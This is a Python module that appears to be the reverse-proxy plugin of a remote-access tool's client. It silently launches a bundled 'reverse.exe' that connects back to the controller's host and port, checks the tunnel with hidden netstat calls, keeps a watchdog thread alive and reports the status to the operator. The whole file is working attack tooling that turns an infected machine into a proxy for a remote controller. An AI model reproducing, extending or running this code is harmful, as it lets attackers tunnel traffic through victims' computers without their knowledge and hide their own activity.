import subprocess
import os
import time
import threading

base_dir = os.path.dirname(os.path.abspath(__file__))
program_path = os.path.join(base_dir, "..", "plugins", "proxy", "reverse.exe")
program_path = os.path.normpath(program_path)

import subprocess

def is_connection_established(host, remote_port):
    try:
        netstat_output = subprocess.check_output(
            f'netstat -ano | findstr "{host}:{remote_port}"',
            shell=True,
            stderr=subprocess.STDOUT,
            creationflags=subprocess.CREATE_NO_WINDOW
        ).decode('utf-8')
        if "ESTABLISHED" in netstat_output.upper():
            return True
        return False
    except subprocess.CalledProcessError:
        return False

def monitor_reverseproxy(self, process):
    try:
        while True:
            if not self.reverseproxy:
                process.terminate()
                break
            time.sleep(5)
    except:
        pass
    
def start_reverseproxy(self, data):
    try:
        port = data.get("port")
        if not port:
            raise ValueError("Port not provided in data")

        if not os.path.exists(program_path):
            raise FileNotFoundError(f"The path {program_path} does not exist")

        try:
            command = [program_path, "-connect", f"{self.host}:{port}"]
            process = subprocess.Popen(command, shell=True, stderr=subprocess.STDOUT)

            time.sleep(5)

            if is_connection_established(self.host, port):
                threading.Thread(target=monitor_reverseproxy, args=(self, process), daemon=True).start()
                message = "Connected"
            else:
                self.reverseproxy = False
                message = "Not connected"

        except Exception as e:
            self.reverseproxy = False
            raise RuntimeError(f"Failed to start reverse.exe: {e}")

        self.send_message('response', self.converter.encode({"reverseproxy": message}))

    except Exception as e:
        self.reverseproxy = False
        self.send_message('response', self.converter.encode({"reverseproxy_logger": f"From Client: {str(e)}"}))